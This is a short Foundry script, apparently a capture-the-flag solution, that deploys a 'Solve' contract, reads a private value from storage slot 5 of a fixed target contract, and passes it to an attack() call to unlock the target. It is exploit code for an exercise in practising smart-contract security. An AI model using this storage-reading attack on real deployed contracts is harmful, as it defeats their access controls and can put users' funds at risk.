// SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.13;

import "../src/Solve.sol";
import {Script} from "forge-std/Script.sol";
import "forge-std/console.sol";

contract Deploy is Script {
    address target = 0x2b961E3959b79326A8e7F64Ef0d2d825707669b5;
    bytes32 data;

    function run() external {
        vm.startBroadcast();

        Solve solve = new Solve(target);

        data = vm.load(target, bytes32(uint256(5)));

        console.log("Solve Contract Address:", address(solve));
        console.log("Target balance:", target.balance);
        console.log("data[2]:");
        console.logBytes32(data);

        solve.attack(bytes16(data));

        vm.stopBroadcast();
    }
}